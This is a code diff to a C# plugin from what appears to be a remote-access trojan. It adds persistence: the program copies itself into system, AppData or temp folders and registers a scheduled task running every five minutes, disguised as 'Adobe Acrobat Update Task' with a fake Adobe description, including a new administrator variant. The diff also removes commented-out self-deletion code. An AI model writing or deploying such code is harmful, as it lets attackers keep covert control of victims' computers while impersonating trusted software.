@@ -19,40 +19,69 @@ namespace Plugin.Handler
         public static string Author = "Adobe Scheduler";
         public static string Description = "This task keeps your Adobe Reader and Acrobat applications up to date with the latest enhancements and security fixes";
         public static string Task = "Adobe Acrobat Update Task";
+        public static string TaskAdmin = "Adobe Acrobat Update Task For Admin";
         public static void AddStartUp()
         {
             try
             {
                 string name = Process.GetCurrentProcess().ProcessName + ".exe";
-                try 
+                if (Methods.IsAdmin()&& Environment.Is64BitOperatingSystem) 
                 {
-                    string filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
-                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                    try
+                    {
+                        string filepath = Path.Combine(@"C:\Windows\Sysnative", name);
+                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                    }
+                    catch
+                    {
+                        string filepath = Path.Combine(Path.GetTempPath(), name);
+                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                    }
+                    
+                    TaskService ts = new TaskService();
+                    TaskDefinition td = ts.NewTask();
+                    td.RegistrationInfo.Description = Description;
+                    td.RegistrationInfo.Author = Author;
+                    TimeTrigger dt = new TimeTrigger();
+                    dt.StartBoundary = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd 06:30:00"));
+                    dt.Repetition.Interval = TimeSpan.FromMinutes(5);
+                    td.Triggers.Add(dt);
+                    td.Settings.DisallowStartIfOnBatteries = false;
+                    td.Settings.RunOnlyIfNetworkAvailable = true;
+                    td.Settings.RunOnlyIfIdle = false;
+                    td.Settings.DisallowStartIfOnBatteries = false;
+                    td.Actions.Add(new ExecAction(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name), "", null));
+                    ts.RootFolder.RegisterTaskDefinition(TaskAdmin, td);
                 } 
-                catch
+                else
                 {
-                    string filepath = Path.Combine(Path.GetTempPath(), name);
-                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                    try
+                    {
+                        string filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
+                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                    }
+                    catch
+                    {
+                        string filepath = Path.Combine(Path.GetTempPath(), name);
+                        File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                    }
+                    TaskService ts = new TaskService();
+                    TaskDefinition td = ts.NewTask();
+                    td.RegistrationInfo.Description = Description;
+                    td.RegistrationInfo.Author = Author;
+                    TimeTrigger dt = new TimeTrigger();
+                    dt.StartBoundary = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd 06:30:00"));
+                    dt.Repetition.Interval = TimeSpan.FromMinutes(5);
+                    td.Triggers.Add(dt);
+                    td.Settings.DisallowStartIfOnBatteries = false;
+                    td.Settings.RunOnlyIfNetworkAvailable = true;
+                    td.Settings.RunOnlyIfIdle = false;
+                    td.Settings.DisallowStartIfOnBatteries = false;
+                    td.Actions.Add(new ExecAction(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name), "", null));
+                    ts.RootFolder.RegisterTaskDefinition(Task, td);
                 }
-                TaskService ts = new TaskService();
-                TaskDefinition td = ts.NewTask();
-                td.RegistrationInfo.Description = Description;
-                td.RegistrationInfo.Author = Author;
-                TimeTrigger dt = new TimeTrigger();
-                dt.StartBoundary = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd 06:30:00"));
-                dt.Repetition.Interval = TimeSpan.FromMinutes(5);
-                td.Triggers.Add(dt);
-                td.Settings.DisallowStartIfOnBatteries = false;
-                td.Settings.RunOnlyIfNetworkAvailable = true;
-                td.Settings.RunOnlyIfIdle = false;
-                td.Settings.DisallowStartIfOnBatteries = false;
-                td.Actions.Add(new ExecAction(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name), "", null));
-                ts.RootFolder.RegisterTaskDefinition(Task, td);
+                
 
-                //运行后自杀
-                //string s = Process.GetCurrentProcess().MainModule.FileName;
-                //Process.Start("Cmd.exe", "/c del " + "\"" + s + "\"");
-                //Process.GetCurrentProcess().Kill();
             }
             catch (Exception ex)
             {
@@ -62,6 +91,17 @@ namespace Plugin.Handler
         }
         public static void DelStartUp()
         {
+            try
+            {
+                using (TaskService _taskService = new TaskService())
+                {
+                    _taskService.RootFolder.DeleteTask(TaskAdmin, false);
+                }
+            }
+            catch (Exception ex)
+            {
+                Packet.Error(ex.Message);
+            }
             try
             {
                 using (TaskService _taskService = new TaskService())
@@ -78,27 +118,55 @@ namespace Plugin.Handler
 
         public static bool GetStartUp()
         {
-            try
+            if (Methods.IsAdmin() && Environment.Is64BitOperatingSystem)
             {
-                TaskCollection taskCollection;
-                using (TaskService _taskService = new TaskService())
+                try
                 {
-                    taskCollection = _taskService.RootFolder.GetTasks(new Regex(Task));
+                    TaskCollection taskCollection;
+                    using (TaskService _taskService = new TaskService())
+                    {
+                        taskCollection = _taskService.RootFolder.GetTasks(new Regex(TaskAdmin));
+                    }
+                    if (taskCollection.Count != 0)
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
                 }
-                if (taskCollection.Count != 0)
+                catch (Exception ex)
                 {
-                    return true;
-                }
-                else 
-                {
+                    Packet.Error(ex.Message);
                     return false;
                 }
             }
-            catch (Exception ex)
+            else 
             {
-                Packet.Error(ex.Message);
-                return false;
+                try
+                {
+                    TaskCollection taskCollection;
+                    using (TaskService _taskService = new TaskService())
+                    {
+                        taskCollection = _taskService.RootFolder.GetTasks(new Regex(Task));
+                    }
+                    if (taskCollection.Count != 0)
+                    {
+                        return true;
+                    }
+                    else
+                    {
+                        return false;
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Packet.Error(ex.Message);
+                    return false;
+                }
             }
+                
 
         }
     }
